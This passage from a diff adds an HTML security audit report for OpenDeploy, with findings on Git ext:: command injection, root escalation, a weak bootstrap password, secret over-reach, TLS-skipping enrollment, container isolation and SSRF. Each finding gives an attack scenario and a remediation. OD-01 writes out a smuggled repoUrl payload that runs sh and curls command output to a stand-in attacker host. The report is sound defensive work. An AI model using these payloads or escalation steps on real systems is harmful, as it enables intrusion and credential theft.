+        <line x1="356" y1="97" x2="386" y2="97" stroke="#334155" stroke-width="1.6" marker-end="url(#arrow)"/>
+        <line x1="558" y1="97" x2="588" y2="97" stroke="#b91c1c" stroke-width="2" marker-end="url(#arrowred)"/>
+        <line x1="740" y1="97" x2="770" y2="97" stroke="#b91c1c" stroke-width="2" marker-end="url(#arrowred)"/>
+      </svg>
+      <div class="dcap">Attacker-controlled string survives untouched from the API to Git's command-executing transport.</div>
+    </div>
+
+    <div class="kv"><div class="k">Attack scenario</div>
+      <p>An authenticated <code class="inl">default</code> caller (or an unauthenticated attacker who first walks
+      the OD-03 chain) sends:</p>
+      <pre>POST /v1/repo/validate
+{ "nixDockerBuild": { "repoUrl": <span class="rd">"ext::sh -c curl% http://attacker/$(id)"</span>, "checkRepo": true } }</pre>
+      <p>The string contains <code class="inl">://</code>, so it is returned verbatim and handed to
+      <code class="inl">git ls-remote --heads</code>. Git's <code class="inl">ext::</code> transport runs
+      <code class="inl">sh -c</code>, giving code execution as the OpenDeploy process — <em>outside</em> any
+      container sandbox. The same payload stored as a deployment's repo detonates later via
+      <code class="inl">PostV1DeploymentVersions</code> / at prepare time.</p>
+    </div>
+
+    <div class="fix"><div class="k">Remediation</div>
+      <ul>
+        <li>Validate <code class="inl">repoUrl</code> against a strict allowlist <em>before</em> it reaches Git:
+          require scheme ∈ {<code class="inl">https</code>, <code class="inl">ssh</code>} or an
+          <code class="inl">owner/repo</code> shorthand; reject anything containing <code class="inl">::</code>,
+          spaces, or a leading <code class="inl">-</code>.</li>
+        <li>Set <code class="inl">GIT_ALLOW_PROTOCOL=https:ssh</code> (and <code class="inl">GIT_PROTOCOL_FROM_USER=0</code>)
+          in <code class="inl">cmd.Env</code> for every <code class="inl">git</code> invocation — this alone kills the
+          <code class="inl">ext::</code>/<code class="inl">file::</code> vector.</li>
+        <li>Pass <code class="inl">--</code> before the URL argument to prevent flag injection.</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- OD-02 -->
+  <div class="finding sev-crit" id="od-02">
+    <h3><span class="fid">OD-02</span> Service account is root-equivalent (ambient caps + writable ExecStart + sudo restart)</h3>
+    <div class="badges">
+      <span class="chip c-crit">CRITICAL</span>
+      <span class="cwe">CWE-250 Execution with Unnecessary Privileges</span>
+      <span class="cwe">CWE-732 Incorrect Permission Assignment</span>
+      <span class="cwe">CWE-269 Improper Privilege Management</span>
+    </div>
+    <div class="kv"><div class="k">Location</div>
+      <span class="loc">internal/installer/assets/opendeploy.service:35 (+26–34)</span>
+      <span class="loc">internal/installer/assets/sudoers:4,7,10</span>
+      <span class="loc">internal/installer/install.go:294,305,311,321</span>
+    </div>
+
+    <div class="kv"><div class="k">What &amp; why</div>
+      <p>The unit is nominally unprivileged (<code class="inl">User=opendeploy</code>) but the security
+      separation is cosmetic. Three facts combine:</p>
+      <pre><span class="cm">// opendeploy.service</span>
+User=opendeploy
+<span class="cm"># NoNewPrivileges is intentionally not set …</span>
+<span class="rd">AmbientCapabilities=CAP_NET_BIND_SERVICE CAP_SETUID CAP_SETGID CAP_KILL CAP_CHOWN CAP_SYS_ADMIN CAP_DAC_OVERRIDE</span></pre>
+      <ol>
+        <li><b>Ambient <code class="inl">CAP_SETUID</code> + <code class="inl">CAP_SYS_ADMIN</code>.</b> Ambient
+          caps sit in the process's <em>effective</em> set and are inherited across <code class="inl">execve</code>
+          into every child (including preparers running arbitrary <code class="inl">nix</code>/<code class="inl">git</code>).
+          <code class="inl">CAP_SETUID</code> alone lets the process call <code class="inl">setuid(0)</code>.</li>
+        <li><b>The executable is writable by the service user.</b> The installer creates
+          <code class="inl">/var/lib/opendeploy/bin</code> and the release binary <code class="inl">0755</code>
+          owned by <code class="inl">opendeploy</code> (<code class="inl">install.go:311,321</code>).</li>
+        <li><b>Passwordless restart.</b> Sudoers grants
+          <code class="inl">NOPASSWD: /usr/bin/systemctl restart opendeploy.service</code> (and the containerd unit).</li>
+      </ol>
+      <p>The sudoers rules themselves are exact-match with no wildcards — well written in isolation. The danger is
+      that their restart <em>targets</em> are attacker-writable.</p>
+    </div>
+
+    <div class="diagram">
+      <svg viewBox="0 0 900 250" role="img" aria-label="privilege escalation paths">
+        <rect x="20" y="100" width="150" height="60" rx="8" fill="#ea580c"/>
+        <text x="95" y="126" text-anchor="middle" font-size="13" font-weight="700" fill="#fff">opendeploy uid</text>
+        <text x="95" y="144" text-anchor="middle" font-size="10.5" fill="#fff7ed">(RCE / leaked / build)</text>
+
+        <!-- path A -->
+        <rect x="230" y="30" width="220" height="56" rx="8" fill="#fff" stroke="#334155" stroke-width="1.5"/>
+        <text x="340" y="52" text-anchor="middle" font-size="11.5" font-weight="700" fill="#0f172a">Path A · overwrite binary</text>
+        <text x="340" y="69" text-anchor="middle" font-size="10" fill="#475569">/var/lib/opendeploy/bin/opendeploy (0755, owned)</text>
+
+        <rect x="480" y="30" width="200" height="56" rx="8" fill="#fff" stroke="#334155" stroke-width="1.5"/>
+        <text x="580" y="52" text-anchor="middle" font-size="11" font-weight="700" fill="#0f172a">sudo systemctl restart</text>
+        <text x="580" y="69" text-anchor="middle" font-size="10" fill="#475569">opendeploy.service (NOPASSWD)</text>
+
+        <!-- path B -->
+        <rect x="230" y="164" width="220" height="56" rx="8" fill="#fff" stroke="#334155" stroke-width="1.5"/>
+        <text x="340" y="186" text-anchor="middle" font-size="11.5" font-weight="700" fill="#0f172a">Path B · rename runtime dir</text>
+        <text x="340" y="203" text-anchor="middle" font-size="10" fill="#475569">parent 0750 owned → plant containerd</text>
+
+        <rect x="480" y="164" width="200" height="56" rx="8" fill="#fff" stroke="#334155" stroke-width="1.5"/>
+        <text x="580" y="186" text-anchor="middle" font-size="11" font-weight="700" fill="#0f172a">sudo systemctl restart</text>
+        <text x="580" y="203" text-anchor="middle" font-size="10" fill="#475569">opendeploy-containerd (runs as root)</text>
+
+        <rect x="720" y="98" width="160" height="64" rx="8" fill="#7f1d1d"/>
+        <text x="800" y="126" text-anchor="middle" font-size="15" font-weight="700" fill="#fff">ROOT</text>
+        <text x="800" y="146" text-anchor="middle" font-size="10" fill="#fecaca">setuid(0) / exec as root</text>
+
+        <line x1="170" y1="120" x2="228" y2="60" stroke="#334155" stroke-width="1.6" marker-end="url(#arrow)"/>
+        <line x1="170" y1="140" x2="228" y2="192" stroke="#334155" stroke-width="1.6" marker-end="url(#arrow)"/>
+        <line x1="450" y1="58" x2="478" y2="58" stroke="#334155" stroke-width="1.6" marker-end="url(#arrow)"/>
+        <line x1="450" y1="192" x2="478" y2="192" stroke="#334155" stroke-width="1.6" marker-end="url(#arrow)"/>
+        <line x1="680" y1="58" x2="740" y2="112" stroke="#b91c1c" stroke-width="2" marker-end="url(#arrowred)"/>
+        <line x1="680" y1="192" x2="740" y2="150" stroke="#b91c1c" stroke-width="2" marker-end="url(#arrowred)"/>
+      </svg>
+      <div class="dcap">Two independent escalation paths. Path B reaches a root process even if the ambient caps on the main unit are fixed.</div>
+    </div>
+
+    <div class="kv"><div class="k">Attack scenario</div>
+      <p>Anyone who gains code execution as the <code class="inl">opendeploy</code> uid — via OD-01, a malicious
+      build artifact, or a leaked credential — overwrites the service binary, runs
+      <code class="inl">sudo systemctl restart opendeploy.service</code>, and the replacement starts with ambient
+      <code class="inl">CAP_SETUID</code> → <code class="inl">setuid(0)</code> → persistent root. Path B works via
+      standard Unix parent-directory semantics: <code class="inl">/var/lib/opendeploy</code> is
+      <code class="inl">0750</code> and owned by <code class="inl">opendeploy</code>, so its
+      <code class="inl">runtime/</code> child (root-owned files) can be renamed away and replaced, then started as
+      root by the containerd unit.</p>
+    </div>
+
+    <div class="fix"><div class="k">Remediation</div>
+      <ul>
+        <li>Own the ExecStart targets as <code class="inl">root:root</code> and make them non-writable by the
+          service; stage self-updates through a small, audited privileged helper.</li>
+        <li>Remove <code class="inl">CAP_SETUID</code>/<code class="inl">CAP_SETGID</code>/<code class="inl">CAP_SYS_ADMIN</code>
+          from <code class="inl">AmbientCapabilities</code>; keep only what the main process needs (likely just
+          <code class="inl">CAP_NET_BIND_SERVICE</code>) and set <code class="inl">NoNewPrivileges=yes</code>.
+          Drop caps + change uid before spawning preparer/build children.</li>
+        <li>Set the sticky bit (or restructure ownership) so service-owned dirs cannot rename root-owned children;
+          prefer a systemd-side restart trigger over a sudo restart primitive.</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ===================== HIGH FINDINGS ===================== -->
+<section id="findings-high">
+  <h2>High findings</h2>
+
+  <!-- OD-03 -->
+  <div class="finding sev-high" id="od-03">
+    <h3><span class="fid">OD-03</span> Weak, unauthenticated, un-rate-limited master-password bootstrap</h3>
+    <div class="badges">
+      <span class="chip c-high">HIGH</span>
+      <span class="cwe">CWE-521 Weak Password Requirements</span>
+      <span class="cwe">CWE-307 Improper Restriction of Auth Attempts</span>
+      <span class="cwe">CWE-306 Missing Authentication</span>
+    </div>
+    <div class="kv"><div class="k">Location</div>
+      <span class="loc">backend/handler/auth.go:34–64 (NO_AUTH)</span>
+      <span class="loc">internal/installer/install.go:394–398</span>
+      <span class="loc">internal/installer/assets/env.template</span>
+    </div>
+    <div class="kv"><div class="k">What &amp; why</div>
+      <p>The bootstrap password generated at install is <code class="inl">"opendeploy" + 4 digits</code> — a
+      keyspace of <span class="label">10,000</span>:</p>
+      <pre><span class="cm">// install.go</span>
+n, _ := rand.Int(rand.Reader, big.NewInt(<span class="rd">10000</span>))
+password := fmt.Sprintf(<span class="gr">"opendeploy%04d"</span>, n.Int64())</pre>
+      <p>The template also ships a fixed argon2id hash for the publicly-documented password
+      <code class="inl">opendeploy-setup</code>. <code class="inl">POST /v1/auth/master</code> is
+      <code class="inl">NO_AUTH</code>, has no rate limiting or lockout (verified: the web mux has no
+      throttling middleware), and — critically — <span class="label">auto-creates a user</span> for any unknown
+      username and returns a <code class="inl">passkey:create</code> token:</p>
+      <pre><span class="cm">// auth.go — PostV1AuthMaster</span>
+if errors.Is(err, sqlite.ErrNotFound) {
+    id := int32(h.Store.UserCount()) + 1
+    <span class="rd">h.Store.WriteUser(user)</span>   <span class="cm">// anyone with the password creates a new admin identity</span>
+}
+token, _ := h.jwtAuth.GenerateTokenWith(user.ID, []string{<span class="gr">"passkey:create"</span>}, 10*time.Minute)</pre>
+      <p>Nothing disables master login once passkeys exist. So the password is a permanent, unthrottled path to
+      creating fresh admin accounts — not just a one-time bootstrap.</p>
+    </div>
+    <div class="kv"><div class="k">Attack scenario</div>
+      <p>An attacker who can reach the primary brute-forces the 10⁴ setup password in seconds (or uses the known
+      <code class="inl">opendeploy-setup</code> default), mints a <code class="inl">passkey:create</code> token,
+      registers <em>their own</em> passkey, and receives a 7-day <code class="inl">default</code> session — full
+      control of the deployment control plane. This is the entry point for the unauthenticated OD-01 → OD-02 chain.</p>
+    </div>
+    <div class="fix"><div class="k">Remediation</div>
+      <ul>
+        <li>Generate a high-entropy setup secret (≥128 bits, base32) and never ship a hash of a known password.</li>
+        <li>Disable master-password login once the first passkey is registered (or gate it behind a one-time
+          setup window); do not auto-create additional users on master login.</li>
+        <li>Add rate limiting / exponential backoff / lockout to <code class="inl">/v1/auth/master</code> and
+          <code class="inl">/v1/auth/master/password/verify</code>.</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- OD-04 -->
+  <div class="finding sev-high" id="od-04">
+    <h3><span class="fid">OD-04</span> Any enrolled worker can read the entire secret store, configs, and the GitHub token</h3>
+    <div class="badges">
+      <span class="chip c-high">HIGH</span>
+      <span class="cwe">CWE-862 Missing Authorization</span>
+      <span class="cwe">CWE-639 Authorization Bypass Through User-Controlled Key</span>
+    </div>
+    <div class="kv"><div class="k">Location</div>
+      <span class="loc">backend/primary/primary.go:86–92 (github creds)</span>
+      <span class="loc">…:94–119 (assets)</span>
+      <span class="loc">…:133–149 (secrets)</span>
+      <span class="loc">…:151–164 (configs)</span>
+    </div>
+    <div class="kv"><div class="k">What &amp; why</div>
+      <p>Cluster endpoints authenticate the worker by mTLS CN but never check that the requesting machine is
+      actually assigned the resource it asks for. <code class="inl">GetV1ClusterSecrets</code> resolves whatever
+      id list arrives:</p>
+      <pre><span class="cm">// primary.go</span>
+func (p *Primary) GetV1ClusterSecrets(authCtx apigen.Context, req *apigen.ClusterSecretsRequest) (...) {
+    <span class="rd">values, err := p.secrets.ResolveMany(req.Ids)   // no check against machineFromContext(authCtx)</span>
+    ...
+}</pre>
+      <p>The verified CN (<code class="inl">machineFromContext</code>) is available but unused here.
+      <code class="inl">GetV1ClusterAsset</code> streams any asset by numeric id, and
+      <code class="inl">GetV1ClusterGithubCredentials</code> returns the org token to any peer.</p>
+    </div>
+    <div class="diagram">
+      <svg viewBox="0 0 820 200" role="img" aria-label="worker secret over-reach">
+        <rect x="20" y="70" width="170" height="60" rx="8" fill="#334155"/>
+        <text x="105" y="96" text-anchor="middle" font-size="12.5" font-weight="700" fill="#fff">Worker (CN=web-01)</text>
+        <text x="105" y="114" text-anchor="middle" font-size="10.5" fill="#cbd5e1">compromised / malicious</text>
+
+        <rect x="330" y="30" width="220" height="44" rx="8" fill="#fff" stroke="#059669" stroke-width="1.6"/>
+        <text x="440" y="52" text-anchor="middle" font-size="11" font-weight="700" fill="#047857">Intended: only web-01's secrets</text>
+        <text x="440" y="66" text-anchor="middle" font-size="10" fill="#475569">(what the model relies on)</text>
+
+        <rect x="330" y="118" width="220" height="52" rx="8" fill="#fff" stroke="#b91c1c" stroke-width="2"/>
+        <text x="440" y="140" text-anchor="middle" font-size="11.5" font-weight="700" fill="#0f172a">Actual: Ids=[1,2,3,…,N]</text>
+        <text x="440" y="157" text-anchor="middle" font-size="10.5" fill="#b91c1c">ResolveMany returns all in plaintext</text>
+
+        <rect x="640" y="72" width="160" height="56" rx="8" fill="#7c3aed"/>
+        <text x="720" y="96" text-anchor="middle" font-size="12" font-weight="700" fill="#fff">Entire store</text>
+        <text x="720" y="114" text-anchor="middle" font-size="10" fill="#ede9fe">secrets · configs · gh token</text>
+
+        <line x1="190" y1="90" x2="328" y2="55" stroke="#059669" stroke-width="1.4" stroke-dasharray="5 4" marker-end="url(#arrowgreen)"/>
+        <line x1="190" y1="110" x2="328" y2="140" stroke="#b91c1c" stroke-width="2" marker-end="url(#arrowred)"/>
+        <line x1="550" y1="144" x2="638" y2="110" stroke="#b91c1c" stroke-width="2" marker-end="url(#arrowred)"/>
+      </svg>
+      <div class="dcap">A worker that should see only its own secrets can enumerate and exfiltrate every secret in the cluster.</div>
+    </div>
+    <div class="kv"><div class="k">Attack scenario</div>
+      <p>A single compromised worker (or a stolen <code class="inl">node.key</code>, or a malicious node an admin
+      accepted) calls <code class="inl">GET /v1/cluster/secrets</code> with <code class="inl">Ids=[1..N]</code> and
+      exfiltrates the whole secret store plus the GitHub token — defeating the documented property that "secrets
+      never reach a secondary beyond what it runs."</p>
+    </div>
+    <div class="fix"><div class="k">Remediation</div>
+      <p>Scope every cluster read to the requesting machine: derive the allowed secret/config/asset id set from the
+      deployments actually scheduled on <code class="inl">machineFromContext(authCtx)</code> and reject ids outside
+      it. Gate the GitHub token to workers that genuinely need it.</p>
+    </div>
+  </div>
+
+  <!-- OD-05 -->
+  <div class="finding sev-high" id="od-05">
+    <h3><span class="fid">OD-05</span> Enrollment disables TLS verification → worker takeover via MITM</h3>
+    <div class="badges">
+      <span class="chip c-high">HIGH</span>
+      <span class="cwe">CWE-295 Improper Certificate Validation</span>
+      <span class="cwe">CWE-300 Channel Accessible by Non-Endpoint (MITM)</span>
+    </div>
+    <div class="kv"><div class="k">Location</div>
+      <span class="loc">backend/secondary/enrollment.go:123–128</span>
+    </div>
+    <div class="kv"><div class="k">What &amp; why</div>
+      <p>A joining worker's first contact with the primary performs no server-identity verification:</p>
+      <pre><span class="cm">// secondary/enrollment.go</span>
+return &http.Client{Transport: &http.Transport{
+    TLSClientConfig: &tls.Config{<span class="rd">InsecureSkipVerify: true</span>},
+}}</pre>
+      <p>The CSR design keeps the worker's private key off the wire (good — passive capture is prevented), but
+      active MITM is wide open. The code comment concedes it: "Fingerprint pinning can replace this bootstrap skip
+      later."</p>
+    </div>
+    <div class="diagram">
+      <svg viewBox="0 0 820 170" role="img" aria-label="enrollment MITM">
+        <rect x="20" y="60" width="150" height="56" rx="8" fill="#334155"/>
+        <text x="95" y="84" text-anchor="middle" font-size="12.5" font-weight="700" fill="#fff">New worker</text>
+        <text x="95" y="101" text-anchor="middle" font-size="10.5" fill="#cbd5e1">no trust root yet</text>
+
+        <rect x="320" y="52" width="170" height="66" rx="8" fill="#b91c1c"/>
+        <text x="405" y="78" text-anchor="middle" font-size="12.5" font-weight="700" fill="#fff">On-path attacker</text>
+        <text x="405" y="96" text-anchor="middle" font-size="10.5" fill="#fee2e2">impersonates primary</text>
+        <text x="405" y="110" text-anchor="middle" font-size="10" fill="#fecaca">returns attacker CA + cert</text>
+
+        <rect x="640" y="60" width="150" height="56" rx="8" fill="#334155" opacity="0.55"/>
+        <text x="715" y="84" text-anchor="middle" font-size="12" font-weight="700" fill="#fff">Real primary</text>
+        <text x="715" y="101" text-anchor="middle" font-size="10.5" fill="#e2e8f0">(bypassed)</text>
+
+        <line x1="170" y1="88" x2="318" y2="88" stroke="#b91c1c" stroke-width="2" marker-end="url(#arrowred)"/>
+        <text x="200" y="78" font-size="10" fill="#b91c1c">InsecureSkipVerify</text>
+        <line x1="490" y1="88" x2="638" y2="88" stroke="#94a3b8" stroke-width="1.4" stroke-dasharray="5 4"/>
+      </svg>
+      <div class="dcap">Worker trusts whatever answers on the enrollment port; the attacker becomes the worker's cluster root of trust.</div>
+    </div>
+    <div class="kv"><div class="k">Attack scenario</div>
+      <p>An attacker on the network path intercepts enrollment, receives the worker's CSR, and returns an
+      <code class="inl">EnrollmentAccepted</code> carrying an attacker CA and attacker-signed node cert. The worker
+      writes them as its trust root, then trusts the attacker's "cluster" — receiving and <em>executing</em>
+      deployment specs the attacker pushes.</p>
+    </div>
+    <div class="fix"><div class="k">Remediation</div>
+      <p>Pin the primary's expected certificate/SPKI fingerprint out-of-band (embed it in the enrollment
+      address or a join token) and verify against it instead of <code class="inl">InsecureSkipVerify</code>;
+      alternatively use a pre-shared enrollment token with an HMAC over the primary cert.</p>
+    </div>
+  </div>
+
+  <!-- OD-06 -->
+  <div class="finding sev-high" id="od-06">
+    <h3><span class="fid">OD-06</span> Weak container isolation for untrusted images</h3>
+    <div class="badges">
+      <span class="chip c-high">HIGH</span>
+      <span class="cwe">CWE-250 Unnecessary Privileges</span>
+      <span class="cwe">CWE-16 Configuration</span>
+    </div>
+    <div class="kv"><div class="k">Location</div>
+      <span class="loc">backend/engine/ctrd/client_linux.go:144–174</span>
+      <span class="loc">backend/engine/runner/container.go:151–160,749–753</span>
+    </div>
+    <div class="kv"><div class="k">What &amp; why</div>
+      <p>Deployed images are frequently untrusted (upstream registry images, artifacts built from external repos),
+      yet the OCI sandbox that should contain them is substantially weakened:</p>
+      <pre><span class="cm">// client_linux.go — spec options</span>
+oci.WithImageConfig(img),
+<span class="rd">oci.WithHostNamespace(specs.NetworkNamespace),  // host networking, unconditional</span>
+oci.WithHostHostsFile, oci.WithHostResolvconf,
+oci.WithEnv(spec.Env),
+<span class="cm">// user = image default (often root); mounts default to rw</span></pre>
+      <p>Verified absent across the whole tree: <span class="label">no seccomp profile, no
+      <code class="inl">NoNewPrivileges</code>, no AppArmor, no user namespace / UID remap</span>. With no userns,
+      container UID 0 = host UID 0. It is at least not <code class="inl">--privileged</code> and adds no extra
+      capabilities, so this is <em>missing hardening</em>, not an over-privileged container — but for untrusted
+      images that is still a wide escape/attack surface.</p>
+    </div>
+    <div class="kv"><div class="k">Attack scenario</div>
+      <p>A malicious image running as root in the host network namespace reaches any loopback-bound service (the
+      OpenDeploy API on <code class="inl">:8080</code>, local databases), can craft/sniff L2/L3 traffic, and — with
+      no seccomp / no-new-privileges — has the full kernel syscall surface for escape attempts.</p>
+    </div>
+    <div class="fix"><div class="k">Remediation</div>
+      <p>Apply a default seccomp profile and <code class="inl">NoNewPrivileges</code>; drop host networking (bridge
+      + explicit port mapping) or make it strictly opt-in; default to a non-root user or enable a user namespace so
+      container-root ≠ host-root.</p>
+    </div>
+  </div>
+
+  <!-- OD-07 -->
+  <div class="finding sev-high" id="od-07">
+    <h3><span class="fid">OD-07</span> Arbitrary host-path bind mounts into containers</h3>
+    <div class="badges">
+      <span class="chip c-high">HIGH</span>
+      <span class="cwe">CWE-22 Path Traversal / Improper Path Limitation</span>
+      <span class="cwe">CWE-732 Incorrect Permission Assignment</span>
+    </div>
+    <div class="kv"><div class="k">Location</div>
+      <span class="loc">backend/handler/deployments.go:797–820</span>
+      <span class="loc">backend/engine/ctrd/client_linux.go:130–141</span>
+    </div>
+    <div class="kv"><div class="k">What &amp; why</div>
+      <p>Mount validation only requires a clean absolute host path that is not exactly <code class="inl">/</code>;
+      there is no allowlist and mounts are read-write by default:</p>
+      <pre><span class="cm">// deployments.go — validateContainerMounts</span>
+if filepath.Clean(host) != host || <span class="rd">host == "/"</span> {  <span class="cm">// only "/" itself is blocked</span>
+    return invalidConfigErrf("host path must be a clean absolute path")
+}</pre>
+      <p>So <code class="inl">/etc</code>, <code class="inl">/root</code>, the container runtime socket, and
+      <code class="inl">/var/lib/opendeploy</code> (the encrypted secrets DB <em>and</em> the plaintext
+      <code class="inl">machine.key</code> that decrypts it) are all mountable, read-write, into a container that
+      runs as root (OD-06).</p>
+    </div>
+    <div class="diagram">
+      <svg viewBox="0 0 820 190" role="img" aria-label="host mount escape">
+        <rect x="20" y="40" width="250" height="110" rx="10" fill="#fff7ed" stroke="#ea580c" stroke-dasharray="5 4"/>
+        <text x="34" y="60" font-size="11.5" font-weight="700" fill="#ea580c">CONTAINER (root, no userns)</text>
+        <rect x="44" y="76" width="200" height="52" rx="8" fill="#334155"/>
+        <text x="144" y="98" text-anchor="middle" font-size="12" font-weight="700" fill="#fff">untrusted image</text>
+        <text x="144" y="115" text-anchor="middle" font-size="10.5" fill="#cbd5e1">rw mount: /var/lib/opendeploy</text>
+
+        <rect x="360" y="40" width="440" height="110" rx="10" fill="#fef2f2" stroke="#b91c1c" stroke-dasharray="5 4"/>
+        <text x="374" y="60" font-size="11.5" font-weight="700" fill="#b91c1c">HOST</text>
+        <rect x="380" y="72" width="180" height="30" rx="6" fill="#7c3aed"/>
+        <text x="470" y="92" text-anchor="middle" font-size="11" fill="#fff">machine.key (plaintext KEK)</text>
+        <rect x="380" y="110" width="180" height="30" rx="6" fill="#7c3aed"/>
+        <text x="470" y="130" text-anchor="middle" font-size="11" fill="#fff">primary.db (ciphertext)</text>
+        <rect x="580" y="72" width="200" height="68" rx="6" fill="#7f1d1d"/>
+        <text x="680" y="100" text-anchor="middle" font-size="12" font-weight="700" fill="#fff">= all secrets decrypted</text>
+        <text x="680" y="120" text-anchor="middle" font-size="10" fill="#fecaca">+ write host files as root</text>
+
+        <line x1="270" y1="102" x2="358" y2="95" stroke="#b91c1c" stroke-width="2" marker-end="url(#arrowred)"/>
+        <line x1="560" y1="106" x2="578" y2="106" stroke="#b91c1c" stroke-width="2" marker-end="url(#arrowred)"/>
+      </svg>
+      <div class="dcap">Mounting the data dir hands a container both the ciphertext and the key that decrypts it — bypassing "encrypted at rest".</div>
+    </div>
+    <div class="kv"><div class="k">Attack scenario</div>
+      <p>A deployment mounts <code class="inl">/var/lib/opendeploy</code> (or the containerd socket, or
+      <code class="inl">/root/.ssh</code>) read-write; container-root reads <code class="inl">machine.key</code> +
+      <code class="inl">primary.db</code> to decrypt every secret, or writes host files as root. Under the
+      single-admin model the config author is trusted, but this means the container is <em>not</em> a boundary
+      against a malicious image, and "encrypted at rest" gives no protection once the data dir is mountable.</p>
+    </div>
+    <div class="fix"><div class="k">Remediation</div>
+      <p>Restrict host mounts to an operator-configured allowlist (or forbid them and require asset mounts). At
+      minimum deny the data dir, runtime sockets, <code class="inl">/etc</code>, and home directories, and default
+      mounts to read-only.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ===================== MEDIUM FINDINGS ===================== -->
+<section id="findings-medium">
+  <h2>Medium findings</h2>
+
+  <!-- OD-08 -->
+  <div class="finding sev-med" id="od-08">
+    <h3><span class="fid">OD-08</span> SSRF via registry host and auth-realm / Link redirect following</h3>
+    <div class="badges"><span class="chip c-med">MEDIUM</span><span class="cwe">CWE-918 Server-Side Request Forgery</span></div>
+    <div class="kv"><div class="k">Location</div>
+      <span class="loc">backend/handler/repo_validate.go:181–193</span>
+      <span class="loc">backend/handler/deployments.go:220–228</span>
+      <span class="loc">backend/engine/versionprovider/containerimage.go:164–214</span>
+    </div>
+    <div class="kv"><div class="k">What &amp; why</div>
+      <p>The registry host is taken from the user-supplied image string and used to build requests with
+      <code class="inl">http.DefaultClient</code> — no allowlist, no internal-range blocking. Worse,
+      <code class="inl">registryBearerToken</code> follows the <code class="inl">realm</code> from a
+      <code class="inl">WWW-Authenticate</code> header to an <em>arbitrary</em> URL, and
+      <code class="inl">nextRegistryPageURL</code> follows <code class="inl">Link</code> headers — both let a hostile
+      "registry" redirect the fetch off the <code class="inl">/v2/</code> path to, e.g.,
+      <code class="inl">http://169.254.169.254/…</code>.</p>
+    </div>
+    <div class="diagram">
+      <svg viewBox="0 0 820 150" role="img" aria-label="SSRF flow">
+        <rect x="16" y="52" width="150" height="48" rx="8" fill="#b91c1c"/>
+        <text x="91" y="72" text-anchor="middle" font-size="11.5" font-weight="700" fill="#fff">image ref (attacker)</text>
+        <text x="91" y="89" text-anchor="middle" font-size="10" fill="#fee2e2">127.0.0.1:9443/v2/x</text>
+        <rect x="206" y="52" width="160" height="48" rx="8" fill="#fff" stroke="#334155" stroke-width="1.5"/>
+        <text x="286" y="72" text-anchor="middle" font-size="11.5" font-weight="700" fill="#0f172a">versionprovider</text>
+        <text x="286" y="89" text-anchor="middle" font-size="10" fill="#475569">GET https://host/v2/…</text>
+        <rect x="406" y="52" width="170" height="48" rx="8" fill="#fff" stroke="#ca8a04" stroke-width="2"/>
+        <text x="491" y="72" text-anchor="middle" font-size="11" font-weight="700" fill="#0f172a">401 → follow realm/Link</text>
+        <text x="491" y="89" text-anchor="middle" font-size="10" fill="#a16207">arbitrary URL, off /v2/</text>
+        <rect x="616" y="52" width="188" height="48" rx="8" fill="#7f1d1d"/>
+        <text x="710" y="72" text-anchor="middle" font-size="11.5" font-weight="700" fill="#fff">internal endpoint</text>
+        <text x="710" y="89" text-anchor="middle" font-size="10" fill="#fecaca">metadata / cluster ports</text>
+        <line x1="166" y1="76" x2="204" y2="76" stroke="#334155" stroke-width="1.6" marker-end="url(#arrow)"/>
+        <line x1="366" y1="76" x2="404" y2="76" stroke="#334155" stroke-width="1.6" marker-end="url(#arrow)"/>
+        <line x1="576" y1="76" x2="614" y2="76" stroke="#b91c1c" stroke-width="2" marker-end="url(#arrowred)"/>
+      </svg>
+    </div>
+    <div class="kv"><div class="k">Attack scenario</div>
+      <p><code class="inl">POST /v1/repo/validate</code> with an image whose registry host is an internal address
+      probes internal services; a malicious registry redirects the token/pagination fetch to cloud metadata. Status
+      and first-tag JSON are reflected back, giving an oracle.</p>
+    </div>
+    <div class="fix"><div class="k">Remediation</div>
+      <p>Resolve the registry host and reject RFC1918/loopback/link-local/ULA (resolve-then-pin against DNS
+      rebinding); restrict realm and <code class="inl">Link</code> follow-targets to the same registry host, or
+      re-run the SSRF guard on every hop.</p>
+    </div>
+  </div>
+
+  <!-- OD-09 -->
+  <div class="finding sev-med" id="od-09">
+    <h3><span class="fid">OD-09</span> No signature verification of downloaded binaries/images; curl|bash from <code>main</code></h3>
+    <div class="badges"><span class="chip c-med">MEDIUM</span><span class="cwe">CWE-494 Download of Code Without Integrity Check</span><span class="cwe">CWE-345 Insufficient Verification of Authenticity</span></div>
+    <div class="kv"><div class="k">Location</div>
+      <span class="loc">backend/engine/preparer/ghrelease.go:365–429</span>
+      <span class="loc">backend/engine/ctrd/client_linux.go:60–71</span>
+      <span class="loc">scripts/install_primary.sh · README.md</span>
+    </div>
+    <div class="kv"><div class="k">What &amp; why</div>
+      <p>Release assets are downloaded, <code class="inl">chmod 0755</code>, and run (via symlink + systemd restart)
+      with <span class="label">no SHA/signature verification</span>. Container images are pulled by mutable tag with
+      no digest pinning enforced. The install one-liner pulls the script from the <code class="inl">main</code>
+      branch (a moving target) and verifies the binary against a <code class="inl">sha256sums.txt</code> fetched
+      from the <em>same</em> release — so the checksum detects transit corruption only, not a tampered release or
+      compromised account. The verified binary then runs as root.</p>
+      <p class="callout info" style="margin-top:8px">Good contrast: the bundled containerd/runc deps <em>are</em>
+      pinned with per-arch SHA-256 baked into the binary (<code class="inl">installer/config.go</code>). Apply the
+      same discipline to the agent binary and images.</p>
+    </div>
+    <div class="fix"><div class="k">Remediation</div>
+      <p>Sign releases (minisign/cosign) and verify the signature against a key pinned in the installer/binary; pin
+      the install script to a tagged commit, not <code class="inl">main</code>; pin container images by digest and
+      verify the resolved digest.</p>
+    </div>
+  </div>
+
+  <!-- OD-10 -->
+  <div class="finding sev-med" id="od-10">
+    <h3><span class="fid">OD-10</span> SQLite DB (master hash + encrypted secrets) is group-readable</h3>
+    <div class="badges"><span class="chip c-med">MEDIUM</span><span class="cwe">CWE-732 Incorrect Permission Assignment</span></div>
+    <div class="kv"><div class="k">Location</div>
+      <span class="loc">backend/storage/sqlite/init.go:31</span>
+      <span class="loc">opendeploy.service (no UMask)</span>
+    </div>
+    <div class="kv"><div class="k">What &amp; why</div>
+      <p><code class="inl">sql.Open</code> creates <code class="inl">primary.db</code> (+ <code class="inl">-wal</code>/
+      <code class="inl">-shm</code>) with no explicit mode and no follow-up <code class="inl">chmod</code>; under
